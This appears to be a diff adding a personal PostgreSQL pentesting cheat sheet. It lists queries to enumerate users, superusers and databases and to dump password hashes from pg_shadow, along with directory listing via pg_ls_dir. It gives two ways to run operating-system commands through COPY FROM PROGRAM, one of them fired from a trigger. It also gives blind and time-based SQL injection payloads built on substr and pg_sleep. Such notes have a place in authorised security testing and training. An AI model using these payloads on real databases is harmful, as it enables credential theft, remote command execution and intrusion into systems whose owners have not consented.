@@ -1,0 +1,147 @@
+select version()  # OR psql -V 
+
+select usename,passwd from pg_shadow; /* shows just usenames no paswords */
+
+SELECT USERS
+---------------
+select usename from pg_user; - works 
+
+pg_user table has following columns on  PostgreSQL 14.5 
+
+select * from pg_user;
+ usename  | usesysid | usecreatedb | usesuper | userepl | usebypassrls |  passwd  | valuntil | useconfig 
+----------+----------+-------------+----------+---------+--------------+----------+----------+-----------
+
+IS USER ADMIN?
+----------------
+
+select usename from pg_user where usename = 'postgres' and usesuper is TRUE;
+
+SELECT ADMINS:
+----------------
+
+select usename from pg_user where usesuper is true;
+
+List privileges:
+-----------------
+
+SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+
+SELECT HASHES:
+--------------
+SELECT usename, passwd FROM pg_shadow 
+
+DATABASES:
+-------------
+
+CURRENT DATABASE: select current_database();
+
+SELECT datname FROM pg_database; 
+
+or 
+
+SELECT datname FROM pg_database WHERE datistemplate = false;
+
+psql -U postgres --list
+
+LIST ALL TABLES:
+---------------
+
+SELECT table_schema,table_name FROM information_schema.tables ORDER BY table_schema,table_name;
+
+SELECT TABLES:
+-=--------------
+SELECT table_name FROM information_schema.tables WHERE table_schema='postgres'; 
+
+LIST DIRECTORIES:
+-----------------
+
+SELECT pg_ls_dir('/tmp/');
+
+RUN SYSTEM COMMAND:
+-------------------
+
+Metho1:
+
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
+CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
+COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
+SELECT * FROM cmd_exec;                 -- [Optional] View the results
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
+
+Method2: 
+
+CREATE TABLE trigger_test (
+    tt_id serial PRIMARY KEY,
+    command_output text
+);
+
+CREATE OR REPLACE FUNCTION trigger_test_execute_command()
+RETURNS TRIGGER
+LANGUAGE plpgsql
+AS $BODY$
+BEGIN
+    COPY trigger_test (command_output) FROM PROGRAM 'echo 123';
+    RETURN NULL;
+END;
+$BODY$;
+
+CREATE TABLE trigger_test_source (
+    s_id integer PRIMARY KEY
+);
+
+CREATE TRIGGER tr_trigger_test_execute_command
+    AFTER INSERT
+    ON trigger_test_source
+    FOR EACH STATEMENT
+    EXECUTE PROCEDURE trigger_test_execute_command();
+
+INSERT INTO trigger_test_source VALUES (2);
+
+TABLE trigger_test;
+ tt_id │ command_output 
+───────┼────────────────
+     1 │ 123
+
+SELECT SUBSTRING()
+--------------------
+
+select substring('string',1,5) 
+
+------------------------------------
+BLIND SQL INJECTION
+------------------------------------
+
+select substr(version(),11,5) -> 14.5 
+
+select substr(version(),1,10); -> PostgreSQL 
+
+select substr(version(),11,5) union select '1';
+
+IF ELSE THEN
+---------------
+SELECT field1, field2,
+  CASE
+    WHEN field1>0 THEN field2/field1
+    ELSE 0
+  END 
+  AS field3
+FROM test
+
+select substr(version(),1,10) = 'PostgreSQL' -> TRUE
+
+select substr(version(),1,10) = 'PostgreSQL1' -> false 
+
+IF THEN ELSE 
+-------------
+
+select case when substring(version(),1,10)='PostgreSQL' then pg_sleep(3) else pg_sleep(0) end from pg_database limit 1;
+
+time based: 
+--------------
+
+select 1 union select 1 from pg_sleep(1);
+
+select 1 from pg_sleep(5)
+;(select 1 from pg_sleep(5))
+||(select 1 from pg_sleep(5))
